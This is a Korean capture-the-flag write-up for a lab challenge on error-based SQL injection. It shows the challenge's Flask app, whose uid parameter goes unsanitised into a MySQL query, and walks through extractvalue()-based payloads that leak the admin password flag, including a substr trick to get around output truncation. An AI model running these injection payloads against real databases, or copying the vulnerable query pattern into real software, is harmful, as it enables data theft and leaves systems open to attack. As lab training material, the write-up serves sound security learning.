참고한 자료

[https://www.bugbountyclub.com/pentestgym/view/53](https://www.bugbountyclub.com/pentestgym/view/53)

[https://opentutorials.org/module/4291/26731](https://opentutorials.org/module/4291/26731)

[https://johyungen.tistory.com/408](https://johyungen.tistory.com/408)

# 문제파일 다운로드
![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5db098b0-366e-4537-9a67-2268e7bc573f/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)


문제 파일을 다운로드 받으면 app.py와 init.sql이 있다. 아래는 app.py의 코드이다.

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

# 코드 분석

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)
```

MYSQL 데이터베이스에 로컬호스트로 접속하여 user_db에 알아서 password까지 입력하여 접근해준다. 

```python
template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''
```

접속하면 나오는 템플릿이다. 사용자에게 특별한 결과값을 전달해 주지 않는다. (즉 블라인드다.)

 

```python
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template
```

uid 값을 입력받아서 특별한 검증없이 SQL Query인 “SELECT * FROM users Where uid=’입력값’;” 을 실행시킨다. 이로 인해 사용자 입력값을 넣어 원하는 쿼리를 실행시킬 수 있다.

그리고 init.sql 을 살펴보면 테이블의 구조를 알 수 있다.

```python
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
FLUSH PRIVILEGES;
```

테이블의 구조를 보면 

테이블의 이름 : user

테이블에 있는 컬럼 : idx, uid, upw

idx는 저절로 생성되는 auto_increment 인덱스값이고 uid는 id 를 의미하는 128바이트값, upw는 password를 의미하는 128바이트 값이다.

그리고 이 테이블에 저장된 uid,upw 값을 보면 (admin, flag),(guest,guest),(test,test)가 있다. 즉 우리가 실행할 SQL Query는 “SELECT * FROM users Where uid=’입력값’;” 이므로 uid가 admin인 값을 가져오고 flag값(upw)을 알아내면 된다.

# 문제 접근

우리가 입력값을 넣어줄 쿼리는 app.py에서 확인할 수 있다.

`"SELECT * FROM user WHERE uid='{uid}';"`

여기서 uid값이 우리 입력값이고 검증없이 넣어줄 수 있기 때문에 잘못된 쿼리가 되도록 admin’ and를 넣어 주었다. (주석 처리를 안했음)

잘못된 sql query를 넣어주었을 때 오류메시지가 뜨는 것을 보아 error based sql injection이 가능해보인다.

![에러메시지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f5e15896-dc6f-4d33-9c0f-a68acd15fc50/%EC%97%90%EB%9F%AC%EB%A9%94%EC%8B%9C%EC%A7%80.png)

`(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")`

MariaDb를 사용하는 것으로 보인다.(코드확인 할때는 MySQL이었는데?) 하지만 상관없다. MYSQL과 MariaDB의 경우 MySQL 기준 버전이 5.1이상인 경우 extractvalue()함수를 이용하여 오류 기반의 공격이 가능하다.

extractvalue함수는 두 개의 인자가 필요한데 xml_frag(XML)과 XPath표현식이 필요하다. 즉 

extractvalue(xml, XPath 표현식) 형태로 이루어져있는데 두번째 인자인 XPath 표현식에 문제가 생기면 오류가 발생한다.

근데 이 때 중요한 점이 XPath 표현식 자리에 SQL Query를 넣어주면 SQL Query의 결과값이 출력된다는 점이다. 이를 이용해서 공격이 가능하다.

XPath 표현식이 일단 잘못된 표현식이어야 하므로 SQL Query 앞에 특정 문자를 넣어 줘서 잘못된 표현식으로 만들어 준다. 가장 많이 사용하는 방법으로는 

1. XPath 표현식 앞에 \n 줄바꿈 문자(0x0a)를 넣어주기
    1. (1105, "XPATH syntax error: '\n쿼리결과값'") 으로 쿼리 결과값 앞에 \n이 붙으면서 에러가 나온다.
2. XPath 표현식 앞에 , 쉼표(0x2c)를 넣어주기
    1. (1105, "XPATH syntax error: ',쿼리결과값'") 으로 쿼리결과값 앞에 ,가 붙으면서 에러가 나온다.
3. XPath 표현식 앞에 : 콜론(0x3a)를 넣어주기
    1. (1105, "XPATH syntax error: ':쿼리결과값'") 으로 쿼리 결과값 앞에 :가 붙으면서 에러가 나온다.

이 외에도 하면서 0x2a값도 넣어봤는데 역시 에러 값 잘나오는 걸로 봐서는 위의 세개를 많이 사용하지만 XPath 표현식이 유효하지만 않게 만들어주면 되는 것 같다.

그러면 어떤식으로 넣어줘야 할까?

"SELECT * FROM user WHERE uid='{uid}';"

이기 때문에 SELECT * From user where uid= ‘admin’ and extractvalue(0x0a,concat(0x0a, SQL쿼리))--형태로 넣어주면 된다. and 앞의 값은 참이 나올것이지만 and 뒤에 extractvalue에서 XPath 표현식 위치에서 SQL쿼리 앞에 0x0a를 넣어주어 잘못된 표현식이 되므로 에러가 발생하도록 한다.

그래서 uid 값에`admin' and extractvalue(0x0a,concat(0x0a,(Select upw from user where uid='admin')))-- -` 를 넣어 주었다. 왜냐면 우리가 원하는 SQL 쿼리 결과값은 admin의 upw값(flag)이므로 upw 값을 select하되 uid가 admin인 것으로 골라주면 되기 때문이다.

그러면 쿼리문은  `SELECT * From user where uid= ‘admin’ and extractvalue(0x0a,concat(0x0a,(Select upw from user where uid='admin')))-- -` 가 되어서 오류가 나는 위치인 extractvalue에서 sql 쿼리 결과값(select upw from user where uid=’admin’) 에 \n(0x0a)를 붙여서 결과가 나올 것이다.

`(1105, "XPATH syntax error: '\nDH{c3968c78840750168774ad951...'")` 가 나왔다. 짤려서 나오는데 왜 이렇고 이를 어떻게 해결해야할까?

XML 내장함수인 extractvalue는 32글자 길이제한이 있기 때문에 짤려서 나온다. 따라서 sql query에서 애초에 출력값을 substr을 이용하여 32개씩 출력하게 한다면 나눠서 출력시킬수 있다. 위의 값은 그러면 총 32자리 만큼 출력된 것이므로 중간부터 출력하게 만들어보자.

`admin' and extractvalue(0x0a,concat(0x0a,(SELECT substr(upw,20,32) FROM user WHERE uid='admin'))) -- -` 를 넣어주면 이제 admin의 upw 값을 출력하되 20번째 글자부터 32자리를 출력하게 된다.

`(1105, "XPATH syntax error: '\n8774ad951fc98bf788563c4d}'")` 가 나온다.

즉 `DH{c3968c78840750168774ad951...'")` (1~32자리)와 `8774ad951fc98bf788563c4d}'")`(20~52(최대)자리를 이어서 합쳐주면 admin의 upw(flag값)은 `DH{c3968c78840750168774ad951fc98bf788563c4d}` 임을 알 수 있다.
